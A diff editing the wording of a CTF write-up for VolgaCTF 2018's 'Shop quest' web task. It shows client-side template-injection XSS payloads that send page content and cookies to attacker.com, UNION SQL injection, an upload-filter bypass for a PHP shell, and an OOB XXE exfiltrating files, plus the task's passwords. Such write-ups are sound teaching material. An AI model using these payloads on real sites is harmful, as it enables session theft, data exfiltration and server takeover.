@@ -1,12 +1,12 @@
 # Shop quest
 Category: Web Points: 500 Solves: 0 Description:
 
-For this task, teams could get 500 points, so it consisted of several stages that led to the execution of the code. 
+For this task, teams could get 500 points, it consisted of several stages that led to the execution of the code. 
 Unfortunately, because of the heavy workload, the task sometimes worked slowly, but it was still possible to solve it. 
-Nobody received the flag, although some teams went 2 stages out of three and almost reached the goal. 
+Nobody received the flag, although some teams went through 2 stages out of three and almost reached the goal. 
 I hope that to solve it in any case was interesting and glad that many attempted to get the flag.
 
-## Stage one - Client side
+## Stage 1 - Client side
 Firstly, we can see a main page. In the browser console, we can see the name of the Vue.js framework used to chat with the operator.
 Secondly, in source code we can see injection point, there is the customer name, which is specified at registration.
 
@@ -17,13 +17,13 @@ Final attack vector for stealing Operator info:
 ```
 ${toString.constructor('var http=new XMLHttpRequest();http.open("POST","http://attacker.com/?bot", true);http.setRequestHeader("Content-type","application/x-www-form-urlencoded");http.send("res="+btoa(unescape(encodeURIComponent(document.body.innerHTML))));')()}
 ```
-On *attacker.com* we can see the page where the operator is located reads our message.
+On *attacker.com* we can see the page where the operator is located reading our message.
 Decode this page and find operator's password:
 
 *Change your default password: Floise_default_@@@f*
 
 But, you can ask: "Where can I find the login? Login "Operator" doesn't work!"
-Ok) We can see non http only cookie - *userId*. This is IDOR. We can steal operator's cookie and make request on the server with it.
+Ok) We can see non http only cookie - *userId*. This is IDOR. We can steal operator's cookie and make request to the server with it.
 
 ```${toString.constructor('document.location = "http://attacker.com/?"+document.cookie')()}```
 
@@ -57,7 +57,7 @@ WoW! The third one retrieve status code 200! So, there is injection in chat tabl
 ```SELECT * FROM `chat_<chatId>````
 
 This is UNION based injection and we can see output. 
-After a difficult dumping of the database structure, we learn the login and password hash of the admin.
+After a difficult dumping of the database structure, we find out the login and password hash of the admin.
 
 Query:
 ```
@@ -81,7 +81,7 @@ Password: insaneclownposse
 
 ## Stage 3 - RCE
 
-This stage is final and alows uploadin php shell. There is simple extension filter in upoads, words *php* and *htm* are replaced by empty string.
+This stage is final and allows uploading php shell. There is simple extension filter in uploads, words *php* and *htm* are replaced by empty string.
 
 We have simple bypass like: *shell.pphphp*
 
@@ -95,7 +95,7 @@ However, even if the file is valid, the error is returned, that the functionalit
 
 *{"status":"error","message":"Table `goods` doesn't exist"}*
 
-Let's try OOB XXE, and read index.php. There is exist on the server maybe. Send this payload:
+Let's try OOB XXE, and read index.php. Maybe it exists on the server. Send this payload:
 ```
 <?xml version="1.0" ?>
 <!DOCTYPE r [
@@ -113,7 +113,7 @@ oob.xml
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
 ```
 
-We recieved index.php and than we have to read several files to find the file download code:
+We received index.php and than we have to read several files to find the file download code:
 ```
 require_once 'utils/Core.php';
 ```
@@ -135,9 +135,15 @@ Finally, file is uploaded to:
 
 user_login = Bibant, and we can finally find the flag:
 
-[http://shop-quest.quals.2018.volgactf.ru/uploads_FjsyFkf/a616589f9ab86eb8f51060dc6da4f545/ZoSkHTE.php?c=find / -name flag*](http://shop-quest.quals.2018.volgactf.ru/uploads_FjsyFkf/a616589f9ab86eb8f51060dc6da4f545/ZoSkHTE.php?c=find / -name flag* "Find flag")
+*Find flag:*
+```
+http://shop-quest.quals.2018.volgactf.ru/uploads_FjsyFkf/a616589f9ab86eb8f51060dc6da4f545/ZoSkHTE.php?c=find / -name flag*
+```
 
-[http://shop-quest.quals.2018.volgactf.ru/uploads_FjsyFkf/a616589f9ab86eb8f51060dc6da4f545/ZoSkHTE.php?c=cat /home/flag*](http://shop-quest.quals.2018.volgactf.ru/uploads_FjsyFkf/a616589f9ab86eb8f51060dc6da4f545/ZoSkHTE.php?c=cat /home/flag* "Read flag")
+*Read flag:*
+```
+http://shop-quest.quals.2018.volgactf.ru/uploads_FjsyFkf/a616589f9ab86eb8f51060dc6da4f545/ZoSkHTE.php?c=cat /home/flag*
+```
 
 Flag is: VolgaCTF{30ff764e5e70f8df3d3f6944c12d0f1a}
 
